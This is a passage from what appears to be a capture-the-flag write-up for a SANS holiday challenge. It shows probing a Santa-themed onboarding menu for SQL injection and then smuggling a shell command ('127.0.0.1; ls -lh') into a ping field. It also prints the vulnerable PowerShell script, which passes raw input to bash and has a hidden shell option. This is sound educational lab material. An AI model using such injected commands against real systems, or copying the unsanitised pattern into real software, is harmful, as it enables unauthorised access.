&lt;li&gt;&lt;code&gt;[✓]&lt;/code&gt; Cranberry Pi (answer &lt;a class="reference external" href="/posts/2017/01/05/sans-christmas-challenge-2016/#part-3-a-fresh-baked-holiday-pi"&gt;here&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Elderberry Pi&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;In 2017, the North Pole was being bombarded by giant objects. What were
they?&lt;ol class="loweralpha"&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; TCP packets&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[✓]&lt;/code&gt; Snowballs (answer &lt;a class="reference external" href="/posts/2018/01/10/sans-christmas-challenge-2017/#introduction"&gt;here&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Misfit toys&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Candy canes&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;In 2017, Sam the snowman needed help reassembling pages torn from what?&lt;ol class="loweralpha"&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; The Bash man page&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Scrooge's payroll ledger&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; System swap space&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[✓]&lt;/code&gt; The Great Book (answer &lt;a class="reference external" href="/posts/2018/01/10/sans-christmas-challenge-2017/#introduction"&gt;here&lt;/a&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Answering correctly these questions gives us the hidden phrase,
&lt;code&gt;Happy Trails&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="directory-browsing"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id9"&gt;Directory Browsing&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="minty-candycane-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id10"&gt;Minty Candycane's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;A new employee, Mr Chan, is arriving. However, in order to make his name tag,
we find his first name.&lt;/p&gt;
&lt;pre class="literal-block"&gt;
We just hired this new worker,
Californian or New Yorker?
Think he's making some new toy bag...
My job is to make his name tag.
Golly gee, I'm glad that you came,
I recall naught but his last name!
Use our system or your own plan,
Find the first name of our guy &amp;quot;Chan!&amp;quot;
-Bushy Evergreen
To solve this challenge, determine the new worker's first name and submit to runtoanswer.
====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================
 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.
Please make a selection:
&lt;/pre&gt;
&lt;p&gt;We get access to a simple interface. By pressing &lt;code&gt;1&lt;/code&gt;, we can enter a new
employee's information:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Welcome to Santa&amp;#39;s Castle!
At Santa&amp;#39;s Castle, our employees are our family. We care for each other,
and support everyone in our common goals.
Your first test at Santa&amp;#39;s Castle is to complete the new employee onboarding paperwork.
Don&amp;#39;t worry, it&amp;#39;s an easy test! Just complete the required onboarding information below.
Enter your first name.
&lt;span class="hll"&gt;: John
&lt;/span&gt;Enter your last name.
&lt;span class="hll"&gt;: McClane
&lt;/span&gt;Enter your street address (line 1 of 2).
&lt;span class="hll"&gt;: Test Street
&lt;/span&gt;Enter your street address (line 2 of 2).
:
Enter your city.
&lt;span class="hll"&gt;: New York
&lt;/span&gt;Enter your postal code.
&lt;span class="hll"&gt;: 1111
&lt;/span&gt;Enter your phone number.
:
Enter your email address.
:
Is this correct?
John McClane
Test Street
New York, 1111
&lt;span class="hll"&gt;y/n: y
&lt;/span&gt;Save to sqlite DB using command line
Press Enter to continue...:
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Apparently, the result is saved in a SQLite database. We can try a SQL
injection, and we'll see that special characters are, indeed, not sanitized:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Welcome to Santa&amp;#39;s Castle!
At Santa&amp;#39;s Castle, our employees are our family. We care for each other,
and support everyone in our common goals.
Your first test at Santa&amp;#39;s Castle is to complete the new employee onboarding paperwork.
Don&amp;#39;t worry, it&amp;#39;s an easy test! Just complete the required onboarding information below.
Enter your first name.
&lt;span class="hll"&gt;: John&amp;#39;
&lt;/span&gt;Enter your last name.
:
Enter your street address (line 1 of 2).
:
Enter your street address (line 2 of 2).
:
Enter your city.
:
Enter your postal code.
:
Enter your phone number.
:
Enter your email address.
:
Is this correct?
John&amp;#39;

,
y/n: y
Save to sqlite DB using command line
&lt;span class="hll"&gt;Error: unrecognized token: &amp;quot;&amp;#39;John&amp;#39;&amp;#39;,&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;&amp;#39;)&amp;quot;
&lt;/span&gt;Press Enter to continue...:
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, there is indeed a SQL injection. However, it seems to be in an
&lt;code&gt;INSERT&lt;/code&gt;-kind of statement. While it's possible to perform SQL injection
in these statements, it's kind of a pain, because most of the time, you can't
get the result of your injection.&lt;/p&gt;
&lt;p&gt;So, let's take a look at the other functionality of the menu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="hll"&gt;Please make a selection: 2
&lt;/span&gt;Validating data store for employee onboard information.
&lt;span class="hll"&gt;Enter address of server: 127.0.0.1
&lt;/span&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.075 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms
rtt min/avg/max/mdev = 0.051/0.065/0.075/0.012 ms
onboard.db: SQLite 3.x database
Press Enter to continue...:
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the program seems to perform a &lt;code&gt;ping&lt;/code&gt; on an IP address that we give,
and then to analyze a file called &lt;code&gt;onboard.db&lt;/code&gt;, which seems to be our
SQLite database. Let's see if our IP address is correctly sanitized, or if we
can try some basic command injection:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Validating data store for employee onboard information.
&lt;span class="hll"&gt;Enter address of server: 127.0.0.1; ls -lh
&lt;/span&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.059 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.064 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 0.059/0.062/0.065/0.009 ms
total 5.4M
&lt;span class="hll"&gt;-rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
&lt;/span&gt;&lt;span class="hll"&gt;-rw-rw-rw- 1 root root  24K Dec 14 16:13 onboard.db
&lt;/span&gt;&lt;span class="hll"&gt;-rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
&lt;/span&gt;onboard.db: SQLite 3.x database
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It worked! We were able to execute arbitrary commands, and list the content of
the current directory. The &lt;code&gt;menu.ps1&lt;/code&gt; file seems to be a PowerShell
script which displays the menu of the Cranberry Pi. The &lt;code&gt;runtoanswer&lt;/code&gt;
file seems to be an executable that we have to run in order to give our answer,
to wit the first name of Mr Chan. Let's take a look at &lt;code&gt;menu.ps1&lt;/code&gt;. We can
do this by using our arbitrary command execution to &lt;code&gt;cat menu.ps1&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;$global:firstrun&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$TRUE&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nb"&gt;Show-Menu&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$intro&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;@(&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;We just hired this new worker,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;Californian or New Yorker?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;Think he&amp;#39;s making some new toy bag...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;My job is to make his name tag.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;Golly gee, I&amp;#39;m glad that you came,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;I recall naught but his last name!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;Use our system or your own plan,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;Find the first name of our guy &lt;/span&gt;&lt;span class="se"&gt;`&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;Chan!&lt;/span&gt;&lt;span class="se"&gt;`&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;-Bushy Evergreen&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;To solve this challenge, determine the new worker&amp;#39;s first name and submit to runtoansw&lt;/span&gt;
&lt;span class="s2"&gt;er.&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nv"&gt;$header&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;@(&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;====================================================================&amp;quot;&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;=                                                                  =&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;= S A N T A &amp;#39; S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;=                                                                  =&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;====================================================================&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;cls&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$global:firstrun&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="nv"&gt;$TRUE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;-lt&lt;/span&gt; &lt;span class="nv"&gt;$intro&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;++)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;Is this correct?&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
            &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="nv"&gt;$intro&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="nv"&gt;$global:firstrun&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$FALSE&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;-lt&lt;/span&gt; &lt;span class="nv"&gt;$header&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;++)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="nv"&gt;$header&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; Press &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; to start the onboard process.&amp;#39;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; Press &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; to verify the system.&amp;#39;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; Press &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; to quit.&amp;#39;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;Employee-Onboarding-Form&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;Welcome to Santa&amp;#39;s Castle!&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;At Santa&amp;#39;s Castle, our employees are our family. We care for each other,&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;and support everyone in our common goals.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Your first test at Santa&amp;#39;s Castle is to complete the new employee onboarding paperwork.&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Don&amp;#39;t worry, it&amp;#39;s an easy test! Just complete the required onboarding information below.&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="nv"&gt;$efirst&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your first name.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$elast&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your last name.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$estreet1&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your street address (line 1 of 2).&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$estreet2&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your street address (line 2 of 2).&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$ecity&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your city.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$epostalcode&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your postal code.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$ephone&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your phone number.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;$eemail&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Enter your email address.&lt;/span&gt;&lt;span class="se"&gt;`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;Is this correct?&lt;/span&gt;&lt;span class="se"&gt;`n`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$efirst $elast&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$estreet1&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$estreet2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$estreet2&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$ecity, $epostalcode&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$ephone&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$eemail&amp;quot;&lt;/span&gt;

    &lt;span class="nv"&gt;$input&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;y/n&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$input&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;y&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-Or&lt;/span&gt; &lt;span class="nv"&gt;$input&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Y&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Save to sqlite DB using command line&amp;quot;&lt;/span&gt;
        &lt;span class="nb"&gt;Start-Process&lt;/span&gt; &lt;span class="n"&gt;-FilePath&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;./sqlite3&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-ArgumentList&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;onboard.db &lt;/span&gt;&lt;span class="se"&gt;`&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;INSERT INTO onboard (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$efirst&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;,&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$elast&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$estreet1&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$estreet2&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$ecity&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$epostalcode&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$ephone&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;, &lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;$eemail&lt;/span&gt;&lt;span class="se"&gt;`&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;)&lt;/span&gt;&lt;span class="se"&gt;`&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;Show-Menu&lt;/span&gt;
        &lt;span class="nv"&gt;$input&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Please make a selection&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;cls&lt;/span&gt;
                &lt;span class="n"&gt;Employee-Onboarding-Form&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;cls&lt;/span&gt;
                &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Validating data store for employee onboard information.&amp;quot;&lt;/span&gt;
                &lt;span class="nv"&gt;$server&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Read-Host&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Enter address of server&amp;#39;&lt;/span&gt;
                &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/bin/ping -c 3 $server&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/usr/bin/file onboard.db&amp;quot;&lt;/span&gt;
&lt;span class="hll"&gt;            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;9&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;                &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pwsh&lt;/span&gt;
&lt;/span&gt;                &lt;span class="k"&gt;return&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt;
